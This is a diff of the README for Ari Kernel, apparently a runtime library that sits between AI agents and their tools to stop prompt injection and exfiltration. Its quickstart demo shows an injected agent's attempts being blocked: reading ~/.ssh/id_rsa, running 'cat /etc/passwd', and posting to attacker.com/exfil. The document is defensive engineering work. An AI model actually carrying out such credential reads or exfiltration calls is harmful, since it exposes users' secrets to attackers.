@@ -1,37 +1,16 @@
 # Ari Kernel
 
-AI agents can call tools. **That's the real attack surface.**
-
-Ari Kernel enforces policy on every tool call at runtime — blocking prompt injection, unsafe actions, and data exfiltration.
+**Ari Kernel blocks prompt injection and data exfiltration in AI agents at runtime.**
 
 One line. Zero config. Every tool call goes through the kernel.
 
 ```typescript
-import { createKernel } from "@arikernel/runtime";
-
-const kernel = createKernel({ preset: "safe" });
+const kernel = createKernel({ preset: "safe" })
 ```
 
 [![Security Policy](https://img.shields.io/badge/security-policy-green.svg)](SECURITY.md) [![Contributing](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
 
-**ARI** = **A**gent **R**untime **I**nspector — a userspace runtime that sits between an AI agent and every tool it invokes.
-
-### What it blocks
-
-- **Prompt injection** — malicious instructions reaching tools
-- **Sensitive file access** — e.g. `~/.ssh`, `/etc/passwd`
-- **Unsafe system commands** — shell execution, privilege escalation
-- **Data exfiltration** — outbound requests with sensitive context
-
-### How it works
-
-```
-Agent → Ari Kernel → Tools
-            ↓
-       Policy Engine
-```
-
-Every tool call is intercepted, evaluated against policy and behavioral rules, then allowed, blocked, or quarantined. No prompt filtering. No model alignment required.
+**ARI** = **A**gent **R**untime **I**nspector. It sits between an AI agent and every tool it can invoke — filesystem, HTTP, shell, database — enforcing capability policies, taint tracking, and behavioral rules at execution time. Designed for teams where prompt injection is a realistic threat and runtime containment is required regardless of model behavior. Ari Kernel is a userspace library, not an OS kernel module.
 
 ---
 
@@ -47,49 +26,52 @@ pnpm example:quickstart
 Five tool calls hit the kernel. Three get blocked:
 
 ```
-ALLOWED  web_request(https://example.com)
-ALLOWED  read_file(./data/report.csv)
+Ari Kernel Quickstart
 
-BLOCKED  read_file(~/.ssh/id_rsa)
-BLOCKED  run_command(cat /etc/passwd)
-BLOCKED  http_post(https://attacker.com/exfil)
+Preset: safe | Principal: agent | Behavioral rules: on
+
+  ALLOWED  web_request(https://example.com)
+  ALLOWED  read_file(./data/report.csv)
+  BLOCKED  read_file(~/.ssh/id_rsa)
+           Action 'file.read' denied: behavioral rule triggered by sensitive file access.
+           Run has been quarantined.
+  BLOCKED  run_command(cat /etc/passwd)
+           Run entered restricted mode. Only read-only safe actions are allowed.
+  BLOCKED  http_post(https://attacker.com/exfil)
+           Run entered restricted mode. 'http.post' is blocked.
 
 Quarantined: YES
 ```
 
-The agent fetched a webpage, read a safe file, then tried to steal SSH keys. The behavioral rule detected web taint followed by a sensitive file read — and **quarantined the entire run**. Every subsequent action was locked to read-only.
+The agent fetched a webpage, read a safe file, then tried to steal SSH keys. The behavioral rule detected web taint followed by a sensitive file read — and **quarantined the entire run**. Every subsequent action was locked to read-only. No prompt filtering, no model cooperation needed.
 
 Run `pnpm example:prompt-injection` for the full attack-and-quarantine demo.
 
 ---
 
-## Why Ari Kernel?
+## Why This Matters
 
-Most AI systems rely on prompts for control. But once an agent can execute tools, prompts are no longer a reliable security boundary.
-
-Ari Kernel enforces policy at runtime — where actions actually happen.
-
-- **Prompt injection is inevitable** — every agent that reads external input is vulnerable
-- **Models cannot enforce security** — the LLM can be manipulated; enforcement must happen outside the model
+- **Prompt injection is inevitable** — every agent that reads external input is vulnerable, and no prompt filter reliably stops it
+- **Models cannot enforce security** — the LLM decides what to do, but it can be manipulated; enforcement must happen outside the model
 - **Runtime enforcement is the missing layer** — Ari Kernel blocks dangerous actions at the tool boundary, regardless of what the model decided
 
 ---
 
 ## Who This Is For
 
-- **Teams building AI agents with tool access** — filesystem, HTTP, shell, database
-- **Developers using OpenAI, LangChain, or custom agent frameworks**
-- **Security engineers evaluating agent risk**
+- **Teams deploying AI agents with tool access** — filesystem, HTTP, shell, database
+- **Organizations building LLM-powered workflows** — where agents act autonomously
+- **Security-conscious environments** — where prompt injection is a realistic threat and runtime containment is required
 
 ---
 
 ## Threat Model
 
-Ari Kernel assumes prompt injection will succeed. Instead of trying to filter malicious prompts, it prevents dangerous actions from executing at the tool boundary.
+Ari Kernel assumes prompt injection will succeed. Instead of trying to filter malicious prompts, it prevents dangerous actions from executing at the tool boundary — regardless of what the model decided.
 
-> **Security model in one sentence:** Enforcement happens at the tool execution boundary, not at the prompt layer — the kernel intercepts every tool call and evaluates capability grants, data provenance, and behavioral patterns before permitting execution.
+> **Security model in one sentence:** Enforcement happens at the tool execution boundary, not at the prompt layer — the kernel intercepts every tool call routed through it and evaluates capability grants, data provenance, and behavioral patterns before permitting execution.
 
-Draws on the reference monitor concept from OS security (Anderson, 1972), adapted to userspace agent runtimes. See [Security Model](docs/security-model.md#2-reference-monitor-design) for deployment mode details.
+Draws on the reference monitor concept from OS security (Anderson, 1972), adapted to the constraints of userspace agent runtimes. The degree to which classical reference monitor properties hold depends on deployment mode — see [Security Model](docs/security-model.md#2-reference-monitor-design).
 
 ---
 
@@ -438,7 +420,7 @@ Ari Kernel focuses on **runtime containment**. Even if an agent is successfully 
 - Policy configuration is controlled by the operator
 - The agent interacts with external systems only through the kernel
 
-If an agent bypasses the kernel and executes tools directly, enforcement is lost. For mandatory enforcement with process isolation, use [sidecar mode](#sidecar-mode-recommended-for-production).
+If an agent bypasses the kernel and executes tools directly, enforcement is lost. For mandatory enforcement with process isolation, use [sidecar mode](#sidecar-mode).
 
 ---
 
@@ -772,7 +754,7 @@ await server.listen();
 
 > **Note:** `X-Forwarded-For` should only be trusted when Ari Kernel is deployed behind a reverse proxy. In the default localhost-only configuration, rate limiting uses the direct socket address and is not spoofable.
 
-The sidecar provides process-level isolation: the agent cannot access the policy engine, run-state, or audit log. Each principal gets an independent kernel instance with its own quarantine state. See [Deployment Mode Comparison](docs/security-model.md#64-deployment-mode-comparison) for a comparison of middleware, in-process, and sidecar assurance levels.
+The sidecar provides process-level isolation: the agent cannot access the policy engine, run-state, or audit log. Each principal gets an independent kernel instance with its own quarantine state. See [Deployment Mode Guarantees](docs/security-model.md#deployment-mode-guarantees) for a comparison of middleware, in-process, and sidecar assurance levels.
 
 **Optional runtime guard**: To prevent accidental bypass of the sidecar, enable the runtime guard in the agent process. This intercepts `fetch()` and `child_process` calls, routing them through the sidecar's policy engine:
 
@@ -783,7 +765,7 @@ enableSidecarGuard({ client: new SidecarClient({ principalId: "my-agent" }) });
 // fetch() and child_process are now mediated by the sidecar
 ```
 
-See [Sidecar Guard](docs/security-model.md#63-sidecar-guard-runtime-mediation) for details and limitations. See [Sidecar Mode](docs/sidecar-mode.md) for the full API reference.
+See [Sidecar Guard](docs/security-model.md#sidecar-guard-optional-runtime-mediation) for details and limitations. See [Sidecar Mode](docs/sidecar-mode.md) for the full API reference.
 
 ---
 
@@ -801,7 +783,7 @@ See [Deterministic Replay](docs/replay.md) for the full API reference.
 - **Stub executors** — database and retrieval executors validate and audit calls but do not execute real queries
 - **Adapter coverage** — integrations are thin wrappers; deep framework plugins are not yet available
 - **Replay is decision-only** — deterministic replay verifies security decisions, not external side effects. HTTP requests, file I/O, and shell commands are stubbed during replay.
-- **Middleware taint boundary** — built-in middleware adapters close the taint gap via `observeToolOutput()`, enabling content scanning and auto-taint derivation after tool execution. Custom adapters that do not call `observeToolOutput()` operate in degraded mode. Multi-hop taint propagation is limited to input taint in middleware mode. See [Security Model](docs/security-model.md#46-taint-propagation-boundaries) for details.
+- **Middleware taint boundary** — built-in middleware adapters close the taint gap via `observeToolOutput()`, enabling content scanning and auto-taint derivation after tool execution. Custom adapters that do not call `observeToolOutput()` operate in degraded mode. Multi-hop taint propagation is limited to input taint in middleware mode. See [Security Model](docs/security-model.md#taint-propagation-boundaries) for details.
 
 See [Known Limitations](docs/known-limitations.md) for the complete list including network mediation gaps, content inspection boundaries, and deployment-mode caveats.
 
